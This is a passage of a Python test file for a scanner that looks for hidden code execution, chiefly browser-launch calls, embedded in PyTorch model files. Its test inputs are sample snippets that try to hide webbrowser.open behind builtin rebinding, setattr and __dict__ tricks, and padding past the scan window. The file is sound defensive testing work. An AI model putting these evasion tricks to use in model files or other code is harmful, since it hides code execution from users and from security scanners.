        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.py")

        assert not any(
            finding.type == "code_execution_pattern" and finding.pattern == "Native library loading detected"
            for finding in findings
        )

    def test_scan_model_keeps_dangerous_import_after_uncertain_member_restore(self) -> None:
        source = (
            b"import webbrowser as wb\noriginal = wb.open\nwb.open = print\n"
            b"from webbrowser import open as opener\n"
            b"if condition:\n    wb.open = original\n    from webbrowser import open as opener\n"
            b"opener('https://example.invalid')\n"
        )

        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.py")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == "Web browser launch detected"
            for finding in findings
        )

    def test_scan_model_rejects_uncertain_builtin_print_helper_mutation(self) -> None:
        source = (
            b"import builtins\nimport webbrowser as wb\noriginal = wb.open\n"
            b"if condition:\n    setattr(builtins, 'print', original)\n"
            b"wb.open = builtins.print\nwb.open('https://example.invalid')\n"
        )

        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.py")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == "Web browser launch detected"
            for finding in findings
        )

    @pytest.mark.parametrize(
        "mutation",
        [
            b"builtins.print = original",
            b"bi.__dict__['print'] = original",
            b"setattr(bi, 'print', original)",
        ],
    )
    def test_scan_model_rejects_overwrite_from_mutated_builtin_print(self, mutation: bytes) -> None:
        source = (
            b"import builtins\nimport builtins as bi\nimport webbrowser as wb\n"
            b"original = wb.open\n" + mutation + b"\n"
            b"wb.open = builtins.print\n"
            b"wb.open('https://example.invalid')\n"
        )

        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.py")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == "Web browser launch detected"
            for finding in findings
        )

    def test_scan_model_accepts_self_assignment_of_builtin_print(self) -> None:
        source = (
            b"import builtins\nimport webbrowser as wb\n"
            b"builtins.print = builtins.print\n"
            b"wb.open = builtins.print\n"
            b"wb.open('safe')\n"
        )

        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.py")

        assert not any(
            finding.type == "code_execution_pattern" and finding.pattern == "Web browser launch detected"
            for finding in findings
        )

    @pytest.mark.parametrize(
        ("setup", "default"),
        [
            (b"", b"original"),
            (b"original_print = builtins.print\ndel builtins.__dict__['print']\n", b"original_print"),
        ],
    )
    def test_scan_model_ignores_safe_builtin_print_setdefault(self, setup: bytes, default: bytes) -> None:
        source = (
            b"import builtins\nimport webbrowser as wb\n"
            b"original = wb.open\nwb.open = print\n"
            + setup
            + b"dict.setdefault(builtins.__dict__, 'print', "
            + default
            + b")\n"
            b"wb.open = builtins.print\nwb.open('safe')\n"
        )

        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.py")

        assert not any(
            finding.type == "code_execution_pattern" and finding.pattern == "Web browser launch detected"
            for finding in findings
        )

    def test_scan_model_accepts_safe_else_after_uncertain_typed_alias_rebind(self) -> None:
        source = (
            b"import webbrowser as wb\nwb.open = print\n"
            b"if condition:\n    wb = Holder\nelse:\n    wb.open = print\n"
            b"wb.open('safe')\n"
        )

        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.py")

        assert not any(
            finding.type == "code_execution_pattern" and finding.pattern == "Web browser launch detected"
            for finding in findings
        )

    @pytest.mark.parametrize(
        ("setup", "target"),
        [
            (b"", b"builtins.__dict__"),
            (b"mapping = builtins.__dict__\n", b"mapping"),
            (b"", b"vars(builtins)"),
        ],
    )
    def test_scan_model_rejects_failed_setattr_on_builtin_mapping(self, setup: bytes, target: bytes) -> None:
        source = (
            b"import builtins\nimport webbrowser as wb\nsafe_print = print\n"
            b"original = wb.open\nbuiltins.print = original\n"
            + setup
            + b"try:\n    setattr("
            + target
            + b", 'print', safe_print)\nexcept AttributeError:\n    pass\n"
            b"wb.open = builtins.print\nwb.open('https://example.invalid')\n"
        )

        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.py")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == "Web browser launch detected"
            for finding in findings
        )

    def test_scan_model_ignores_failed_dangerous_setattr_on_builtin_mapping(self) -> None:
        source = (
            b"import builtins\nimport webbrowser as wb\noriginal = wb.open\n"
            b"try:\n    setattr(builtins.__dict__, 'print', original)\n"
            b"except AttributeError:\n    pass\nwb.open = builtins.print\nwb.open('safe')\n"
        )

        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.py")

        assert not any(
            finding.type == "code_execution_pattern" and finding.pattern == "Web browser launch detected"
            for finding in findings
        )

    @pytest.mark.parametrize(
        ("setup", "target"),
        [
            (b"", b"builtins"),
            (b"import builtins as bi\n", b"bi"),
            (b"mapping = builtins\n", b"mapping"),
        ],
    )
    def test_scan_model_ignores_failed_subscript_write_on_builtin_module(
        self,
        setup: bytes,
        target: bytes,
    ) -> None:
        source = (
            b"import builtins\nimport webbrowser as wb\noriginal = wb.open\n"
            + setup
            + target
            + b"['print'] = original\n"
            b"wb.open = print\nwb.open('safe')\n"
        )

        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.py")

        assert not any(
            finding.type == "code_execution_pattern" and finding.pattern == "Web browser launch detected"
            for finding in findings
        )

    @pytest.mark.parametrize(
        "target",
        [
            b"(builtins, builtins.print)",
            b"[builtins, builtins.print]",
        ],
    )
    def test_scan_model_respects_earlier_destructured_builtin_rebind(self, target: bytes) -> None:
        source = (
            b"import builtins\nimport webbrowser as wb\noriginal = wb.open\n" + target + b" = (object(), original)\n"
            b"wb.open = print\nwb.open('safe')\n"
        )

        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.py")

        assert not any(
            finding.type == "code_execution_pattern" and finding.pattern == "Web browser launch detected"
            for finding in findings
        )

    @pytest.mark.parametrize(
        ("setup", "assignment"),
        [
            (b"", b"(bi, bi.print) = (builtins, original)"),
            (
                b"mapping = {}\n",
                b"(mapping, mapping['print']) = (builtins.__dict__, original)",
            ),
        ],
    )
    def test_scan_model_tracks_late_destructured_builtin_binding(
        self,
        setup: bytes,
        assignment: bytes,
    ) -> None:
        source = (
            b"import builtins\nimport webbrowser as wb\noriginal = wb.open\n" + setup + assignment + b"\n"
            b"wb.open = builtins.print\nwb.open('https://example.invalid')\n"
        )

        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.py")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == "Web browser launch detected"
            for finding in findings
        )

    def test_scan_model_uses_preassignment_builtin_value_in_destructuring(self) -> None:
        source = (
            b"import builtins\nimport webbrowser as wb\n"
            b"(builtins, wb.open) = (object(), builtins.print)\n"
            b"wb.open('safe')\n"
        )

        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.py")

        assert not any(
            finding.type == "code_execution_pattern" and finding.pattern == "Web browser launch detected"
            for finding in findings
        )

    @pytest.mark.parametrize(
        "target",
        [
            b"builtins = builtins.print",
            b"builtins = builtins.__dict__['print']",
        ],
    )
    def test_scan_model_respects_chained_builtin_rebind_order(self, target: bytes) -> None:
        source = (
            b"import builtins\nimport webbrowser as wb\noriginal = wb.open\n" + target + b" = original\n"
            b"wb.open = print\nwb.open('safe')\n"
        )

        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.py")

        assert not any(
            finding.type == "code_execution_pattern" and finding.pattern == "Web browser launch detected"
            for finding in findings
        )

    def test_scan_model_tracks_builtin_mutation_before_chained_rebind(self) -> None:
        source = (
            b"import builtins\nimport webbrowser as wb\noriginal = wb.open\n"
            b"builtins.print = builtins = original\n"
            b"wb.open = print\nwb.open('https://example.invalid')\n"
        )

        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.py")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == "Web browser launch detected"
            for finding in findings
        )

    def test_prefix_typed_member_aliases_ignore_scoped_capture(self) -> None:
        prefix = b"import webbrowser as wb\ndef unused():\n    alias = wb.open\n"
        typed_aliases = jit_script_module._typed_import_aliases(prefix)

        aliases = jit_script_module._unsafe_typed_member_aliases(prefix, typed_aliases)

        assert "alias" not in aliases

    def test_prefix_typed_member_aliases_track_mapping_restore(self) -> None:
        prefix = (
            b"import webbrowser as wb\noriginal = wb.open\nwb.open = print\n"
            b"wb.__dict__['open'] = original\nalias = wb.open\n"
        )
        typed_aliases = jit_script_module._typed_import_aliases(prefix)

        aliases = jit_script_module._unsafe_typed_member_aliases(prefix, typed_aliases)

        assert aliases["alias"] == frozenset({("webbrowser", "open", False)})

    def test_prefix_typed_member_aliases_ignore_unknown_replacement(self) -> None:
        prefix = b"import webbrowser as wb\nwb.open = len\nalias = wb.open\n"
        typed_aliases = jit_script_module._typed_import_aliases(prefix)

        aliases = jit_script_module._unsafe_typed_member_aliases(prefix, typed_aliases)

        assert "alias" not in aliases

    def test_prefix_builtins_aliases_ignore_scoped_tail_import(self) -> None:
        padding = b"# pad\n" * (jit_script_module._MAX_EMBEDDED_PYTHON_IMPORT_CONTEXT_BYTES // len(b"# pad\n") + 1)
        prefix = padding + b"def unused():\n    import builtins as bi\n"

        aliases = jit_script_module._builtins_import_aliases(prefix)

        assert "bi" not in aliases

    def test_prefix_builtins_aliases_drop_destructured_tail_rebind(self) -> None:
        padding = b"# pad\n" * (jit_script_module._MAX_EMBEDDED_PYTHON_IMPORT_CONTEXT_BYTES // len(b"# pad\n") + 1)
        prefix = b"import builtins as bi\n" + padding + b"(bi,) = (holder,)\n"

        aliases = jit_script_module._builtins_import_aliases(prefix)

        assert "bi" not in aliases

    def test_prefix_builtins_aliases_keep_destructured_tail_copy(self) -> None:
        padding = b"# pad\n" * (jit_script_module._MAX_EMBEDDED_PYTHON_IMPORT_CONTEXT_BYTES // len(b"# pad\n") + 1)
        prefix = padding + b"(bi,) = (builtins,)\n"

        aliases = jit_script_module._builtins_import_aliases(prefix)

        assert "bi" in aliases

    def test_prefix_builtins_aliases_ignore_scoped_destructured_tail_rebind(self) -> None:
        padding = b"# pad\n" * (jit_script_module._MAX_EMBEDDED_PYTHON_IMPORT_CONTEXT_BYTES // len(b"# pad\n") + 1)
        prefix = b"import builtins as bi\n" + padding + b"def unused():\n    (bi,) = (holder,)\n"

        aliases = jit_script_module._builtins_import_aliases(prefix)

        assert "bi" in aliases

    def test_prefix_alias_rebinding_fallback_skips_parseable_tail_lines(self, monkeypatch: pytest.MonkeyPatch) -> None:
        padding = b"# pad\n" * (jit_script_module._MAX_EMBEDDED_PYTHON_IMPORT_CONTEXT_BYTES // len(b"# pad\n") + 1)
        prefix = b"import builtins as bi\nimport webbrowser as wb\n" + padding + b"bi = holder\nwb = holder\n"
        calls = 0
        original = jit_script_module._has_late_alias_rebinding

        def track_fallback(candidate: bytes, alias: str) -> bool:
            nonlocal calls
            calls += 1
            return original(candidate, alias)

        monkeypatch.setattr(jit_script_module, "_has_late_alias_rebinding", track_fallback)

        builtins_aliases = jit_script_module._builtins_import_aliases(prefix)
        typed_aliases = jit_script_module._typed_import_aliases(prefix)

        assert "bi" not in builtins_aliases
        assert "wb" not in typed_aliases
        assert calls == 0

    def test_prefix_alias_rebinding_fallback_handles_malformed_tail_lines(self) -> None:
        padding = b"# pad\n" * (jit_script_module._MAX_EMBEDDED_PYTHON_IMPORT_CONTEXT_BYTES // len(b"# pad\n") + 1)
        prefix = b"import builtins as bi\nimport webbrowser as wb\n" + padding + b"bi = holder +\nwb = holder +\n"

        builtins_aliases = jit_script_module._builtins_import_aliases(prefix)
        typed_aliases = jit_script_module._typed_import_aliases(prefix)

        assert "bi" not in builtins_aliases
        assert "wb" not in typed_aliases

    def test_prefix_typed_aliases_discover_module_import_in_tail(self) -> None:
        padding = b"# pad\n" * (jit_script_module._MAX_EMBEDDED_PYTHON_IMPORT_CONTEXT_BYTES // len(b"# pad\n") + 1)
        prefix = padding + b"import webbrowser as wb\nalias = wb.open\n"

        typed_aliases = jit_script_module._typed_import_aliases(prefix)
        aliases = jit_script_module._unsafe_typed_member_aliases(prefix, typed_aliases)

        assert typed_aliases["wb"] == "webbrowser"
        assert aliases["alias"] == frozenset({("webbrowser", "open", False)})

    def test_prefix_typed_aliases_ignore_scoped_import_in_tail(self) -> None:
        padding = b"# pad\n" * (jit_script_module._MAX_EMBEDDED_PYTHON_IMPORT_CONTEXT_BYTES // len(b"# pad\n") + 1)
        prefix = padding + b"def unused():\n    import webbrowser as wb\n"

        typed_aliases = jit_script_module._typed_import_aliases(prefix)

        assert "wb" not in typed_aliases

    def test_prefix_typed_aliases_ignore_scoped_destructured_tail_rebind(self) -> None:
        padding = b"# pad\n" * (jit_script_module._MAX_EMBEDDED_PYTHON_IMPORT_CONTEXT_BYTES // len(b"# pad\n") + 1)
        prefix = b"import webbrowser as wb\n" + padding + b"def unused():\n    (wb,) = (holder,)\n"

        typed_aliases = jit_script_module._typed_import_aliases(prefix)

        assert typed_aliases["wb"] == "webbrowser"

    def test_scan_model_detects_typed_import_and_capture_after_import_context(self) -> None:
        import_padding = b"# pad\n" * (
            jit_script_module._MAX_EMBEDDED_PYTHON_IMPORT_CONTEXT_BYTES // len(b"# pad\n") + 8
        )
        call_padding = b"# gap\n" * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# gap\n") + 8
        )
        source = (
            b"\x00\xff"
            + import_padding
            + b"import webbrowser as wb\nalias = wb.open\n"
            + call_padding
            + b"alias('https://example.invalid')\n"
        )

        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.bin")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == "Web browser launch detected"
            for finding in findings
        )

    @pytest.mark.parametrize(
        ("tail_binding", "expected"),
        [
            (b"(bi,) = (Holder,)\n", True),
            (b"(bi,) = (builtins,)\n", False),
        ],
    )
    def test_scan_model_tracks_destructured_builtins_alias_rebind_in_prefix_tail(
        self,
        tail_binding: bytes,
        expected: bool,
    ) -> None:
        import_padding = b"# pad\n" * (
            jit_script_module._MAX_EMBEDDED_PYTHON_IMPORT_CONTEXT_BYTES // len(b"# pad\n") + 8
        )
        call_padding = b"# gap\n" * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# gap\n") + 8
        )
        source = (
            b"\x00\xffimport builtins as bi\nimport webbrowser as wb\n"
            b"class Holder:\n    print = wb.open\n"
            + import_padding
            + tail_binding
            + b"wb.open = bi.print\nwb.open('https://example.invalid')\n"
            + call_padding
        )

        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.bin")
        detected = any(
            finding.type == "code_execution_pattern" and finding.pattern == "Web browser launch detected"
            for finding in findings
        )

        assert detected is expected

    def test_prefix_typed_member_aliases_ignore_unrelated_mapping_update(self) -> None:
        prefix = b"import webbrowser as wb\nother.update(open=1)\nalias = wb.open\n"
        typed_aliases = jit_script_module._typed_import_aliases(prefix)

        aliases = jit_script_module._unsafe_typed_member_aliases(prefix, typed_aliases)

        assert aliases["alias"] == frozenset({("webbrowser", "open", False)})

    def test_prefix_typed_member_aliases_propagate_callable_copy(self) -> None:
        prefix = b"import webbrowser as wb\noriginal = wb.open\nalias = original\n"
        typed_aliases = jit_script_module._typed_import_aliases(prefix)

        aliases = jit_script_module._unsafe_typed_member_aliases(prefix, typed_aliases)

        assert aliases["alias"] == frozenset({("webbrowser", "open", False)})

    def test_prefix_typed_member_aliases_track_shadowed_print_assignment(self) -> None:
        prefix = b"import webbrowser as wb\noriginal = wb.open\nprint = original\nwb.open = print\nalias = wb.open\n"

        aliases = jit_script_module._unsafe_typed_member_aliases(prefix, {})

        assert aliases["alias"] == frozenset({("webbrowser", "open", False)})

    def test_prefix_typed_member_aliases_keep_capture_before_owner_rebind(self) -> None:
        prefix = b"import webbrowser as wb\nalias = wb.open\nwb = Holder\n"

        aliases = jit_script_module._unsafe_typed_member_aliases(prefix, {})

        assert aliases["alias"] == frozenset({("webbrowser", "open", False)})

    def test_prefix_typed_member_aliases_track_destructured_capture(self) -> None:
        prefix = b"import webbrowser as wb\n(opener, ignored) = (wb.open, 0)\n"

        aliases = jit_script_module._unsafe_typed_member_aliases(prefix, {})

        assert aliases["opener"] == frozenset({("webbrowser", "open", False)})

    def test_prefix_typed_member_aliases_ignore_capture_after_owner_rebind(self) -> None:
        prefix = b"import webbrowser as wb\nwb = Holder\nalias = wb.open\n"

        aliases = jit_script_module._unsafe_typed_member_aliases(prefix, {})

        assert "alias" not in aliases

    def test_prefix_typed_member_aliases_preserve_from_import_callable(self) -> None:
        prefix = b"from webbrowser import open as opener\n"

        aliases = jit_script_module._unsafe_typed_member_aliases(prefix, {})

        assert aliases["opener"] == frozenset({("webbrowser", "open", False)})

    def test_prefix_typed_member_aliases_respect_safe_from_import(self) -> None:
        prefix = b"import webbrowser as wb\nwb.open = print\nfrom webbrowser import open as opener\n"

        aliases = jit_script_module._unsafe_typed_member_aliases(prefix, {})

        assert "opener" not in aliases

    def test_prefix_typed_member_aliases_track_static_helper_restore(self) -> None:
        prefix = (
            b"import webbrowser as wb\noriginal = wb.open\nwb.open = print\n"
            b"setattr(wb, 'open', original)\nalias = wb.open\n"
        )

        aliases = jit_script_module._unsafe_typed_member_aliases(prefix, {})

        assert aliases["alias"] == frozenset({("webbrowser", "open", False)})

    def test_prefix_typed_member_aliases_respect_static_helper_safe_overwrite(self) -> None:
        prefix = b"import webbrowser as wb\nsetattr(wb, 'open', print)\nalias = wb.open\n"

        aliases = jit_script_module._unsafe_typed_member_aliases(prefix, {})

        assert "alias" not in aliases

    @pytest.mark.parametrize(("value", "expected"), [(b"original", True), (b"print", False)])
    def test_prefix_typed_member_aliases_replay_helper_call_in_assignment(
        self,
        value: bytes,
        expected: bool,
    ) -> None:
        prefix = (
            b"import webbrowser as wb\noriginal = wb.open\nwb.open = print\n"
            b"ignored = setattr(wb, 'open', " + value + b")\nalias = wb.open\n"
        )

        aliases = jit_script_module._unsafe_typed_member_aliases(prefix, {})

        assert ("alias" in aliases) is expected

    @pytest.mark.parametrize(
        "update",
        [
            b"wb.__dict__.update({'open': %s})",
            b"vars(wb).update({'open': %s})",
            b"dict.__setitem__(wb.__dict__, 'open', %s)",
        ],
    )
    @pytest.mark.parametrize(("value", "expected"), [(b"original", True), (b"print", False)])
    def test_prefix_typed_member_aliases_track_positional_mapping_update(
        self,
        update: bytes,
        value: bytes,
        expected: bool,
    ) -> None:
        prefix = (
            b"import webbrowser as wb\noriginal = wb.open\nwb.open = print\n" + update % value + b"\nalias = wb.open\n"
        )

        aliases = jit_script_module._unsafe_typed_member_aliases(prefix, {})

        assert ("alias" in aliases) is expected

    def test_prefix_typed_member_aliases_capture_same_line_tail_assignment(self) -> None:
        padding = b"# pad\n" * (jit_script_module._MAX_EMBEDDED_PYTHON_IMPORT_CONTEXT_BYTES // len(b"# pad\n") + 1)
        prefix = padding + b"import webbrowser as wb; alias = wb.open\n"

        aliases = jit_script_module._unsafe_typed_member_aliases(prefix, {})

        assert aliases["alias"] == frozenset({("webbrowser", "open", False)})

    def test_prefix_typed_member_aliases_resume_after_trimmed_prefix_parse(self) -> None:
        prefix = b"import webbrowser as wb\x00alias = wb.open\n"

        aliases = jit_script_module._unsafe_typed_member_aliases(prefix, {})

        assert aliases["alias"] == frozenset({("webbrowser", "open", False)})

    def test_prefix_typed_member_aliases_distinguish_reimported_module_identity(self) -> None:
        prefix = (
            b"import sys\nimport webbrowser as old\nold.open = print\n"
            b"sys.modules.pop('webbrowser')\nimport webbrowser as fresh\nalias = fresh.open\n"
        )

        aliases = jit_script_module._unsafe_typed_member_aliases(prefix, {})

        assert aliases["alias"] == frozenset({("webbrowser", "open", False)})

    def test_prefix_typed_member_aliases_respect_safe_setdefault_after_delete(self) -> None:
        prefix = b"import webbrowser as wb\ndel wb.open\nwb.__dict__.setdefault('open', print)\nalias = wb.open\n"

        aliases = jit_script_module._unsafe_typed_member_aliases(prefix, {})

        assert "alias" not in aliases

    def test_prefix_typed_member_aliases_replay_executing_class_body(self) -> None:
        prefix = (
            b"import webbrowser as wb\noriginal = wb.open\nwb.open = print\n"
            b"class Restore:\n    wb.open = original\nalias = wb.open\n"
        )

        aliases = jit_script_module._unsafe_typed_member_aliases(prefix, {})

        assert aliases["alias"] == frozenset({("webbrowser", "open", False)})

    def test_scan_model_clears_callable_alias_overwritten_in_all_branches(self) -> None:
        source = (
            b"from webbrowser import open as opener\n"
            b"if condition:\n    opener = print\nelse:\n    opener = print\n"
            b"opener('safe')\n"
        )

        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.py")

        assert not any(
            finding.type == "code_execution_pattern" and finding.pattern == "Web browser launch detected"
            for finding in findings
        )

    @pytest.mark.parametrize(
        ("prefix", "expected"),
        [
            (
                b"import sys\nimport webbrowser as old\nold.open = print\n"
                b"sys.modules.pop('webbrowser')\nimport webbrowser as fresh\nalias = fresh.open\n",
                True,
            ),
            (
                b"import webbrowser as wb\ndel wb.open\nwb.__dict__.setdefault('open', print)\nalias = wb.open\n",
                False,
            ),
            (
                b"import webbrowser as wb\noriginal = wb.open\nwb.open = print\n"
                b"class Restore:\n    wb.open = original\nalias = wb.open\n",
                True,
            ),
        ],
    )
    def test_scan_model_replays_prefix_member_state_across_split(
        self,
        prefix: bytes,
        expected: bool,
    ) -> None:
        call_padding = b"# gap\n" * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# gap\n") + 8
        )
        source = b"\x00\xff" + prefix + call_padding + b"alias('https://example.invalid')\n"

        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.bin")
        detected = any(
            finding.type == "code_execution_pattern" and finding.pattern == "Web browser launch detected"
            for finding in findings
        )

        assert detected is expected

    def test_prefix_typed_aliases_discover_deterministic_indented_tail_import(self) -> None:
        padding = b"# pad\n" * (jit_script_module._MAX_EMBEDDED_PYTHON_IMPORT_CONTEXT_BYTES // len(b"# pad\n") + 1)
        prefix = padding + b"if True:\n    import webbrowser as wb\nalias = wb.open\n"

        typed_aliases = jit_script_module._typed_import_aliases(prefix)
        aliases = jit_script_module._unsafe_typed_member_aliases(prefix, typed_aliases)

        assert typed_aliases["wb"] == "webbrowser"
        assert aliases["alias"] == frozenset({("webbrowser", "open", False)})

    @pytest.mark.parametrize(
        ("initial_state", "class_body", "expected"),
        [
            (
                b"import webbrowser as wb\noriginal = wb.open\nwb.open = print\n",
                b"    wb.open = original\n",
                True,
            ),
            (b"import webbrowser as wb\n", b"    wb.open = print\n", False),
        ],
    )
    def test_prefix_typed_member_aliases_continue_class_body_split_at_window(
        self,
        initial_state: bytes,
        class_body: bytes,
        expected: bool,
    ) -> None:
        class_header = b"class Restore:\n"
        header_bytes_before_window = 3
        padding_size = (
            jit_script_module._MAX_EMBEDDED_PYTHON_IMPORT_CONTEXT_BYTES
            - len(initial_state)
            - header_bytes_before_window
        )
        prefix = b"#" * (padding_size - 1) + b"\n" + initial_state + class_header + class_body + b"alias = wb.open\n"

        aliases = jit_script_module._unsafe_typed_member_aliases(
            prefix,
            jit_script_module._typed_import_aliases(prefix),
        )

        assert ("alias" in aliases) is expected

    @pytest.mark.parametrize(
        ("initial_state", "class_body", "should_detect"),
        [
            (
                b"import webbrowser as wb\noriginal = wb.open\nwb.open = print\n",
                b"    wb.open = original\n",
                True,
            ),
            (b"import webbrowser as wb\n", b"    wb.open = print\n", False),
        ],
    )
    def test_scan_model_continues_class_body_split_at_prefix_window(
        self,
        initial_state: bytes,
        class_body: bytes,
        should_detect: bool,
    ) -> None:
        class_header = b"class Restore:\n"
        header_bytes_before_window = 3
        padding_size = (
            jit_script_module._MAX_EMBEDDED_PYTHON_IMPORT_CONTEXT_BYTES
            - len(initial_state)
            - header_bytes_before_window
        )
        prefix = b"#" * (padding_size - 1) + b"\n" + initial_state + class_header + class_body + b"alias = wb.open\n"
        call_padding = b"# gap\n" * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# gap\n") + 8
        )
        source = b"\x00\xff" + prefix + call_padding + b"alias('https://example.invalid')\n"

        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.bin")
        detected = any(
            finding.type == "code_execution_pattern" and finding.pattern == "Web browser launch detected"
            for finding in findings
        )

        assert detected is should_detect

    def test_prefix_typed_aliases_ignore_unexecuted_indented_tail_import(self) -> None:
        padding = b"# pad\n" * (jit_script_module._MAX_EMBEDDED_PYTHON_IMPORT_CONTEXT_BYTES // len(b"# pad\n") + 1)
        prefix = padding + b"if False:\n    import webbrowser as wb\nalias = wb.open\n"

        typed_aliases = jit_script_module._typed_import_aliases(prefix)
        aliases = jit_script_module._unsafe_typed_member_aliases(prefix, typed_aliases)

        assert "wb" not in typed_aliases
        assert "alias" not in aliases

    def test_prefix_typed_aliases_keep_deterministic_tail_import_before_malformed_line(self) -> None:
        padding = b"# pad\n" * (jit_script_module._MAX_EMBEDDED_PYTHON_IMPORT_CONTEXT_BYTES // len(b"# pad\n") + 1)
        prefix = padding + b"if True:\n    import webbrowser as wb\nalias = wb.open\nif True print(\n"

        typed_aliases = jit_script_module._typed_import_aliases(prefix)
        aliases = jit_script_module._unsafe_typed_member_aliases(prefix, typed_aliases)

        assert typed_aliases["wb"] == "webbrowser"
        assert aliases["alias"] == frozenset({("webbrowser", "open", False)})

    def test_prefix_typed_aliases_drop_with_item_rebind_before_capture(self) -> None:
        padding = b"# pad\n" * (jit_script_module._MAX_EMBEDDED_PYTHON_IMPORT_CONTEXT_BYTES // len(b"# pad\n") + 1)
        prefix = b"import webbrowser as wb\n" + padding + b"with manager() as wb:\n    pass\nalias = wb.open\n"

        typed_aliases = jit_script_module._typed_import_aliases(prefix)
        aliases = jit_script_module._unsafe_typed_member_aliases(prefix, typed_aliases)

        assert "wb" not in typed_aliases
        assert "alias" not in aliases

    def test_prefix_builtins_aliases_drop_destructured_loop_target(self) -> None:
        padding = b"# pad\n" * (jit_script_module._MAX_EMBEDDED_PYTHON_IMPORT_CONTEXT_BYTES // len(b"# pad\n") + 1)
        prefix = b"import builtins as bi\n" + padding + b"for (bi,) in items:\n    pass\n"

        aliases = jit_script_module._builtins_import_aliases(prefix)

        assert "bi" not in aliases

    def test_prefix_builtins_aliases_drop_loop_target_before_malformed_line(self) -> None:
        padding = b"# pad\n" * (jit_script_module._MAX_EMBEDDED_PYTHON_IMPORT_CONTEXT_BYTES // len(b"# pad\n") + 1)
        prefix = b"import builtins as bi\n" + padding + b"for (bi,) in items:\n    pass\nif True print(\n"

        aliases = jit_script_module._builtins_import_aliases(prefix)

        assert "bi" not in aliases

    def test_prefix_builtins_alias_state_tracks_shadowed_canonical_name(self) -> None:
        aliases, shadowed = jit_script_module._builtins_import_alias_state(b"builtins = Holder\n")

        assert aliases == frozenset()
        assert shadowed == frozenset({"builtins"})

    def test_prefix_builtins_aliases_ignore_lazy_walrus_rebind(self) -> None:
        prefix = b"import builtins as bi\ncallback = lambda: (bi := None)\n"

        aliases = jit_script_module._builtins_import_aliases(prefix)

        assert "bi" in aliases

    def test_compact_replay_calls_inherited_typed_alias_without_print(self) -> None:
        inherited_aliases = {"alias": frozenset({("webbrowser", "open", False)})}

        suppressed, high_risk = jit_script_module._compact_snippet_typed_print_overwrite_replay(
            "alias('https://example.invalid')\n",
            inherited_typed_member_aliases=inherited_aliases,
        )

        assert suppressed == set()
        assert high_risk == {("webbrowser.open", "S109")}

    def test_compact_replay_accepts_inherited_builtins_print_alias(self) -> None:
        suppressed, high_risk = jit_script_module._compact_snippet_typed_print_overwrite_replay(
            "import webbrowser as wb\nwb.open = bi.print\nwb.open('safe')\n",
            inherited_builtins_aliases=frozenset({"bi"}),
        )

        assert suppressed == {("webbrowser.open", "S109")}
        assert high_risk == set()

    def test_compact_replay_does_not_trust_shadowed_inherited_builtins_name(self) -> None:
        suppressed, high_risk = jit_script_module._compact_snippet_typed_print_overwrite_replay(
            "import webbrowser as wb\nwb.open = builtins.print\nwb.open('https://example.invalid')\n",
            inherited_shadowed_builtins_aliases=frozenset({"builtins"}),
        )

        assert suppressed == set()
        assert high_risk == {("webbrowser.open", "S109")}

    def test_compact_replay_uses_inherited_builtins_alias_for_setattr_restore(self) -> None:
        suppressed, high_risk = jit_script_module._compact_snippet_typed_print_overwrite_replay(
            "import builtins\nimport webbrowser as wb\n"
            "original = wb.open\nwb.open = print\n"
            "builtins.setattr = bi.setattr\n"
            "setattr(builtins, 'print', original)\n"
            "wb.open = bi.print\nwb.open('https://example.invalid')\n",
            inherited_builtins_aliases=frozenset({"bi"}),
        )

        assert suppressed == set()
        assert high_risk == {("webbrowser.open", "S109")}

    def test_compact_replay_accepts_safe_inherited_builtins_setattr_restore(self) -> None:
        suppressed, high_risk = jit_script_module._compact_snippet_typed_print_overwrite_replay(
            "import builtins\nimport webbrowser as wb\n"
            "builtins.setattr = bi.setattr\n"
            "setattr(builtins, 'print', print)\n"
            "wb.open = bi.print\nwb.open('safe')\n",
            inherited_builtins_aliases=frozenset({"bi"}),
        )

        assert suppressed == {("webbrowser.open", "S109")}
        assert high_risk == set()

    def test_compact_replay_ignores_typed_alias_defined_only_in_safe_uncertain_branch(self) -> None:
        suppressed, high_risk = jit_script_module._compact_snippet_typed_print_overwrite_replay(
            "if condition:\n    import webbrowser as wb\n    wb.open = print\nwb.open('safe')\n"
        )

        assert suppressed == set()
        assert high_risk == set()

    def test_compact_replay_keeps_preexisting_typed_alias_across_uncertain_safe_overwrite(self) -> None:
        suppressed, high_risk = jit_script_module._compact_snippet_typed_print_overwrite_replay(
            "import webbrowser as wb\nif condition:\n    wb.open = print\nwb.open('https://example.invalid')\n"
        )

        assert suppressed == set()
        assert high_risk == {("webbrowser.open", "S109")}

    @pytest.mark.parametrize(("class_value", "expected"), [("original", True), ("print", False)])
    def test_compact_replay_visits_class_body_in_uncertain_branch(
        self,
        class_value: str,
        expected: bool,
    ) -> None:
        suppressed, high_risk = jit_script_module._compact_snippet_typed_print_overwrite_replay(
